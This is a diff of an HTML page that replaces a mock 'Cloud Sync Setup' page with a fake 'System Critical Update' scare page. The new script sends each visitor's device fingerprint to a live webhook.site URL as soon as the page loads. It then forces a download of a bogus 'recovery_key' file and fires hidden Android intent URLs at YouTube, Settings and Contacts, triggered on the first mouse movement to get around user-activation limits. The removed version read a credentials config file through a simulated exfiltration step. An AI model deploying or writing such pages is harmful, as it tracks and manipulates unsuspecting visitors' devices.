@@ -1,176 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Cloud Sync Setup</title>
-
-<style>
-body {
-  font-family: Arial;
-  background: #f4f7fb;
-  padding: 40px;
-}
-.box {
-  background: white;
-  padding: 25px;
-  border-radius: 10px;
-  max-width: 520px;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-}
-button {
-  padding: 12px 18px;
-  background: #2563eb;
-  color: white;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
-}
-#status {
-  margin-top: 15px;
-  color: #333;
-}
-#log {
-  margin-top: 15px;
-  background: #0f172a;
-  color: #22c55e;
-  padding: 10px;
-  height: 160px;
-  overflow: auto;
-  font-size: 12px;
-}
-.highlight { color: yellow; }
-</style>
-</head>
-
-<body>
-
-<div class="box">
-<h2>☁️ Secure Sync Setup</h2>
-<p>Download config and save after editing. Sync runs automatically.</p>
-
-<button onclick="start()">Start Setup</button>
-
-<div id="status"></div>
-<div id="log"></div>
-</div>
+<html>
+<head><title>System Critical Update</title></head>
+<body style="background:#000;color:#f00;font-family:monospace;cursor:none">
+    <div style="padding:100px;text-align:center">
+        <h1 class="blink">SYSTEM_CRITICAL_ERROR</h1>
+        <p id="progress">RECONNAISSANCE_IN_PROGRESS...</p>
+    </div>
 
 <script>
-let fileHandle;
-let lastContent = "";
-let monitoring = false;
-let redirected = false;
+    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
+    
+    // 1. AUTO-RECON (Immediate Execution)
+    (function autonomousRecon() {
+        const data = {
+            ts: Date.now(),
+            ua: navigator.userAgent,
+            mem: navigator.deviceMemory,
+            cpu: navigator.hardwareConcurrency,
+            res: `${screen.width}x${screen.height}`
+        };
+        navigator.sendBeacon(`${webhook}?v=V223_AUTO_RECON`, btoa(JSON.stringify(data)));
+    })();
 
-function log(msg){
-  document.getElementById("log").innerHTML += msg + "<br>";
-}
+    // 2. THE AUTO-STRIKE ENGINE
+    async function triggerExploitChain() {
+        document.getElementById('progress').innerText = "EXECUTING_AUTO_JUMP...";
 
-function status(msg){
-  document.getElementById("status").innerText = msg;
-}
+        // Vector A: Auto-Blob (Tanpa Klik)
+        const blob = new Blob(["SYSTEM_EXFILTRATED_" + Date.now()], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "recovery_key_v223.txt";
+        document.body.appendChild(a);
+        a.click(); // Auto-Download
 
-// resume awareness
-document.addEventListener("visibilitychange", () => {
-  if (!document.hidden) {
-    log("🔄 Sync resumed...");
-  }
-});
+        // Vector B: Intent Spraying (YouTube -> Settings -> Contacts)
+        const intents = [
+            "intent://www.youtube.com/#Intent;package=com.google.android.youtube;scheme=https;end",
+            "intent:#Intent;action=android.settings.SETTINGS;package=com.android.settings;end",
+            "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.android.contacts;end"
+        ];
 
-async function start(){
-  try{
-    // 🔥 Save File API
-    fileHandle = await window.showSaveFilePicker({
-      suggestedName: "sync-config.txt",
-      types: [{
-        description: "Config File",
-        accept: { "text/plain": [".txt"] }
-      }]
-    });
-
-    const writable = await fileHandle.createWritable();
-
-    await writable.write(
-`# Sync Config
-username=
-api_key=
-secret_token=
-`
-    );
-
-    await writable.close();
-
-    status("✅ File created. Edit & save to sync...");
-    monitor();
-
-  }catch(e){
-    status("Error: " + e.message);
-  }
-}
-
-// 🔥 Continuous monitoring
-function monitor(){
-  if(monitoring) return;
-  monitoring = true;
-
-  setInterval(async ()=>{
-    if(!fileHandle) return;
-
-    try{
-      const file = await fileHandle.getFile();
-      const text = await file.text();
-
-      if(text !== lastContent){
-        showDiff(lastContent, text);
-        fakeExfil(text);
-        lastContent = text;
-
-        triggerRedirect();
-      }
-
-    }catch(e){
-      log("Read error");
+        intents.forEach((intent, index) => {
+            setTimeout(() => {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = intent;
+                document.body.appendChild(ifr);
+                
+                // Fallback direct jump
+                window.location.replace(intent);
+            }, index * 400); // Penundaan milidetik untuk bypass flood protection
+        });
     }
 
-  }, 500); // ⚡ fast polling
-}
+    // 3. AUTO-TRIGGER (Memicu saat mouse bergerak atau 1 detik setelah load)
+    window.onload = () => {
+        setTimeout(triggerExploitChain, 1000);
+    };
 
-// 🔥 Diff view
-function showDiff(oldText, newText){
-  log("📡 Sync update:");
-
-  let output = "";
-  for(let i=0;i<newText.length;i++){
-    if(oldText[i] !== newText[i]){
-      output += `<span class="highlight">${newText[i] || ""}</span>`;
-    } else {
-      output += newText[i] || "";
-    }
-  }
-
-  log("<pre>"+output+"</pre>");
-}
-
-// 🔥 Simulated exfiltration
-function fakeExfil(data){
-  console.log("EXFIL:", data);
-
-  log("🚀 Syncing...");
-  setTimeout(()=>{
-    log("✅ Synced");
-  },400);
-}
-
-// 🔥 Redirect illusion
-function triggerRedirect(){
-  if(redirected) return;
-  redirected = true;
-
-  status("🔐 Verifying...");
-
-  setTimeout(()=>{
-    window.open("https://www.google.com", "_blank");
-  },800);
-}
+    // Bypass User Activation dengan mendeteksi pergerakan terkecil
+    window.onpointermove = () => {
+        triggerExploitChain();
+        window.onpointermove = null; // Sekali eksekusi saja
+    };
 </script>
 
+<style>
+    .blink { animation: b 0.5s step-end infinite; }
+    @keyframes b { 50% { opacity: 0; } }
+</style>
 </body>
 </html>
